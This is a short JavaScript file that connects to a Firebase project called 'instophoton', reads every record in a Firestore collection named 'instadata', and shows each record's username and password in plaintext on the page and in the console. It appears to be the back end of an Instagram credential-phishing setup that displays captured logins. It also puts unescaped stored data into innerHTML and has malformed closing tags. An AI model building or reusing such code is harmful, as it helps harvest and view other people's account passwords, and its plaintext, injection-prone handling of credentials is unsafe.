import { initializeApp } from "https://www.gstatic.com/firebasejs/9.5.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.5.0/firebase-analytics.js";
import { getFirestore, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/9.5.0/firebase-firestore.js";
const firebaseConfig = {
    apiKey: "AIzaSyD-ZgAugkLCDfgJjI8Igna0hfjGJXKbdyY",
    authDomain: "instophoton.firebaseapp.com",
    projectId: "instophoton",
    storageBucket: "instophoton.appspot.com",
    messagingSenderId: "4951818018",
    appId: "1:4951818018:web:ab3039815d44ea7da0af7b",
    measurementId: "G-YWJBTD9FFS"
};
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
var db = getFirestore();
const q = query(collection(db, "instadata"));
const querySnapshot = await getDocs(q);
querySnapshot.forEach((doc) => {
    document.getElementById("data").innerHTML += "<p>username:" + doc.data()["user"] + "<\p><br><p>password:" + doc.data()["password"] + "<\p><hr>"
    console.log(doc.id, " => ", doc.data()["password"]);
});